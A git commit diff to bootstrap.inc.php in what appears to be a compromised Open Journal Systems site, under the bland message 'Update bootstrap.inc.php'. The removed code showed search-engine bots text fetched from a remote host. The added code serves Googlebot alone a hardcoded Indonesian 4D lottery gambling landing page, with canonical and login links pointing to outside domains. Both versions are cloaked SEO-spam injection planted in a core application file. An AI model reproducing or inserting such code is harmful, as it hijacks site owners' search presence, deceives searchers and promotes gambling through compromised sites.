774e03b82e2da60fc63104f0a86728adcdc148df
acimiyek <kevinoin21@gmail.com>
2025-02-26 14:56:57 +0700

    Update bootstrap.inc.php

--- bootstrap.inc.php
+++ bootstrap.inc.php
@@ -1,20 +1,240 @@
 <?php
-function is_bot() {
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
 
-foreach ($bots as $bot) {
-if (stripos($user_agent, $bot) !== false) {
-return true;
-}
-}
+if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
+{
+?>
 
-return false;
-}
+<!DOCTYPE html>
+<html amp lang="en-ID">
 
-if (is_bot()) {
-$message = file_get_contents('https://starbats.site/landing/mexydan.txt');
-echo $message;
+<head>
+   <meta charset="utf-8" />
+   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+   <title>For4D Situs Toto Top Satu Dari Tiga Situs Toto 4D Online Terpercaya</title>
+   <meta name="description"
+      content="For4D merupakan situs toto paling top nomor satu dari tiga situs toto 4d online resmi terpercaya yang ada di indonesia dengan berbagai keunggulan yang memberikan keuntungan untuk anda" />
+   <meta name="keywords"
+      content="For4D, situs toto, situs toto 4d, toto 4d, situs toto terpercaya" />
+   <meta name="robots" content="index,follow" />
+   <link href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXkzLBCWH_uXy4OAEoJSFecmMX0Y-lz_FPXaBzG5Mhs9pnQAxxSCyJY1Fnbfeemg_hmLA_kYDEZQa8zPqPAwxz3DpMw2Boo8DIX-SDNMoBV2NYSqGUEga9SpoykY7qtPTMZ5qxO5OxvC5Y1jYXAw1EI8h2iBHz3RSiGjv_fTmPd4Da-NR3fkGL-BgNB7E/s16000/for4dadwa.png" rel="shortcut icon" type="image/x-icon" />
+
+   <link rel="canonical" href="https://orientalpublication.com/" />
+   <meta property="og:url" content="https://orientalpublication.com/" />
+   <meta property="og:site_name" content="For4D" />
+   <meta property="og:image:alt" content="For4D" />
+   <meta property="og:image"
+      content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjK96Ux9ZGAWt_uULTcV_2ZmVN_TyCxR2gXgvE8ew6aCHTEv4BtJflR9bniPmtmBXqJL6TD03Uivo6tNyf3A5Dw5yDchPYanbt0EwDYLWiaIRZzJGOIStOG28jAn2iR5M_qy0YaegCA6zV0uWOLZ8sBhQRy8zgoQk-IjDIP2hm2BDjjfh1LuYXjj-nWAtVy/s800/mantap.jpg" />
+
+   <link rel="preload" as="script" href="https://cdn.ampproject.org/v0.js" />
+   <script async src="https://cdn.ampproject.org/v0.js"></script>
+   <style amp-boilerplate>
+      body {
+         -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+         -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+         -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+         animation: -amp-start 8s steps(1, end) 0s 1 normal both
+      }
+
+      @-webkit-keyframes -amp-start {
+         from {
+            visibility: hidden
+         }
+
+         to {
+            visibility: visible
+         }
+      }
+
+      @-moz-keyframes -amp-start {
+         from {
+            visibility: hidden
+         }
+
+         to {
+            visibility: visible
+         }
+      }
+
+      @-ms-keyframes -amp-start {
+         from {
+            visibility: hidden
+         }
+
+         to {
+            visibility: visible
+         }
+      }
+
+      @-o-keyframes -amp-start {
+         from {
+            visibility: hidden
+         }
+
+         to {
+            visibility: visible
+         }
+      }
+
+      @keyframes -amp-start {
+         from {
+            visibility: hidden
+         }
+
+         to {
+            visibility: visible
+         }
+      }
+   </style>
+   <noscript>
+      <style amp-boilerplate>
+         body {
+            -webkit-animation: none;
+            -moz-animation: none;
+            -ms-animation: none;
+            animation: none
+         }
+      </style>
+   </noscript>
+
+   <style amp-custom>
+      * {
+         box-sizing: border-box;
+      }
+
+      body {
+         font-family: monospace;
+         position: relative;
+         background: #000000;
+         background-image: radial-gradient(#272727 5%, transparent 50%);
+         background-size: 5px 5px;
+         background-attachment: fixed;
+      }
+
+      .container {
+         max-width: 400px;
+         height: 100vh;
+         margin: 0 auto;
+         padding: 15px;
+         display: flex;
+         flex-direction: column;
+         justify-content: center;
+         overflow: hidden;
+      }
+
+      .welcome {
+         max-width: 350px;
+         margin: 0 auto;
+      }
+
+      .welcome h3 {
+         font-size: 12px;
+         color: #fff;
+         overflow: hidden;
+         border-right: .15em solid #fbf4a0;
+         /* The typwriter cursor */
+         white-space: nowrap;
+         letter-spacing: .09em;
+         animation: typing 3.5s steps(40, end), blink-caret .75s step-end infinite;
+      }
+
+      @keyframes typing {
+         from {
+            width: 0
+         }
+
+         to {
+            width: 100%
+         }
+      }
+
+      @keyframes blink-caret {
+
+         from,
+         to {
+            border-color: transparent
+         }
+
+         50% {
+            border-color: #fbf4a0;
+         }
+      }
+
+      .banner {
+         border-radius: 10px;
+      }
+
+      .btn-login {
+         padding: 10px;
+         color: #ffffff;
+         font-size: 20px;
+         font-weight: bold;
+         text-decoration: none;
+         text-align: center;
+         background: linear-gradient(to bottom, #ff0000 0%, rgb(0, 0, 0) 100%);
+         margin-top: 10px;
+         border-radius: 10px;
+         position: relative;
+         z-index: 2;
+      }
+
+      .btn-daftar {
+         padding: 10px;
+         color: #fff;
+         font-size: 20px;
+         font-weight: bold;
+         text-decoration: none;
+         text-align: center;
+         background: linear-gradient(to bottom, #ff0000 0%, rgb(0, 0, 0) 100%);
+         margin-top: 10px;
+         border-radius: 10px;
+         position: relative;
+         z-index: 2;
+      }
+
+      .copyright {
+         text-align: center;
+         color: #ffffff96;
+      }
+
+      .nagaterbang {
+         position: fixed;
+         z-index: 1;
+         left: 0;
+         right: 0;
+         top: 0;
+         bottom: 0;
+         margin: auto;
+      }
+   </style>
+</head>
+
+<body>
+   <div class="container">
+      <header>
+         <center><a href="https://orientalpublication.com/"><amp-img id="image"
+                  class="animated tada infinite slower" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiPmFqQvHPa-js9FwRSjNnC8XcCWxw4Uyrc_CqCYHggcq7brHW2T_JlO4AA8oj1kROpcKFjz-FM9RKcQ16wpHHFRUOkXYY-LPXIIekfAtBNlqk_Y-5zn0Y7B-UUzFBXN4If8xwvXzwKA8T8jasNVY9pf2qKYm4xwlS3zikx7Ml9gZ97UIg132oLK0xjlbQ/s16000/for4d.gif"
+                  alt="FOR4D" width="300" height="100" layout="intrinsic"></amp-img></a>
+      </header>
+      <div class="welcome">
+         <h3>GABUNG DAN DAFTAR FOR4D SEKARANG !!!</h3>
+      </div>
+
+      <amp-img
+         src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjK96Ux9ZGAWt_uULTcV_2ZmVN_TyCxR2gXgvE8ew6aCHTEv4BtJflR9bniPmtmBXqJL6TD03Uivo6tNyf3A5Dw5yDchPYanbt0EwDYLWiaIRZzJGOIStOG28jAn2iR5M_qy0YaegCA6zV0uWOLZ8sBhQRy8zgoQk-IjDIP2hm2BDjjfh1LuYXjj-nWAtVy/s800/mantap.jpg"
+         width="500" height="500" layout="intrinsic" class="banner"></amp-img>
+
+      <a href="https://preciseurl.org/forjp4D" target="_blank" rel="noreferrer noopener"
+         role="button" class="btn-login">LOGIN</a>
+      <a href="https://preciseurl.org/forjp4D" target="_blank" rel="noreferrer noopener"
+         role="button" class="btn-daftar">DAFTAR</a>
+
+      <p class="copyright">© 2025 - <a style="color: #ffffff;" href="https://orientalpublication.com/">FOR4D</a> • Starbats • All Rights Reserved.</p>
+   </div>
+
+</body>
+
+</html>
+<?php
 exit;
 }
 ?>
@@ -22,68 +242,41 @@ exit;
 <?php
 
 /**
- * @mainpage OJS API Reference
- *
- * Welcome to the OJS API Reference. This resource contains documentation
- * generated automatically from the OJS source code.
- *
- * The design of Open %Journal Systems is heavily structured for
- * maintainability, flexibility and robustness. Those familiar with Sun's
- * Enterprise Java Beans technology or the Model-View-Controller (MVC) pattern
- * will note similarities.
- *
- * As in a MVC structure, data storage and representation, user interface
- * presentation, and control are separated into different layers. The major
- * categories, roughly ordered from "front-end" to "back-end," follow:
- * - Smarty templates, which are responsible for assembling HTML pages to
- *   display to users;
- * - Page classes, which receive requests from users' web browsers, delegate
- *   any required processing to various other classes, and call up the
- *   appropriate Smarty template to generate a response;
- * - Controllers, which implement reusable pieces of content e.g. for AJAX
- *   subrequests.
- * - Action classes, which are used by the Page classes to perform non-trivial
- *   processing of user requests;
- * - Model classes, which implement PHP objects representing the system's
- *   various entities, such as Users, Articles, and Journals;
- * - Data Access Objects (DAOs), which generally provide (amongst others)
- *   update, create, and delete functions for their associated Model classes,
- *   are responsible for all database interaction;
- * - Support classes, which provide core functionalities, miscellaneous common;
- *
- * Additionally, many of the concerns shared by multiple PKP applications are
- * implemented in the shared "pkp-lib" library, shipped in the lib/pkp
- * subdirectory. The same conventions listed above apply to lib/pkp as well.
- *
- * As the system makes use of inheritance and has consistent class naming
- * conventions, it is generally easy to tell what category a particular class
- * falls into.
- *
- * For example, a Data Access Object class always inherits from the DAO class,
- * has a Class name of the form [Something]%DAO, and has a filename of the form
- * [Something]%DAO.inc.php.
- *
- * To learn more about developing OJS, there are several additional resources
- * that may be useful:
- * - The docs/README.md document
- * - The PKP support forum at https://forum.pkp.sfu.ca/
- * - Documentation available at https://docs.pkp.sfu.ca/dev/
- *
- * @file ojs/index.php
+ * @defgroup index Index
+ * Bootstrap and initialization code.
+ */
+
+/**
+ * @file includes/bootstrap.inc.php
  *
  * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
+ * Copyright (c) 2000-2021 John Willinsky
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
  * @ingroup index
  *
- * Bootstrap code for OJS site. Loads required files and then calls the
- * dispatcher to delegate to the appropriate request handler.
+ * @brief Core system initialization code.
+ * This file is loaded before any others.
+ * Any system-wide imports or initialization code should be placed here.
  */
 
-// Initialize global environment
-define('INDEX_FILE_LOCATION', __FILE__);
-$application = require('./lib/pkp/includes/bootstrap.inc.php');
 
-// Serve the request
-$application->execute();
+/**
+ * Basic initialization (pre-classloading).
+ */
+
+define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
+if (!defined('DIRECTORY_SEPARATOR')) {
+	// Older versions of PHP do not define this
+	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
+}
+define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
+chdir(BASE_SYS_DIR);
+
+// System-wide functions
+require('./lib/pkp/includes/functions.inc.php');
+
+// Initialize the application environment
+import('classes.core.Application');
+
+return new Application();
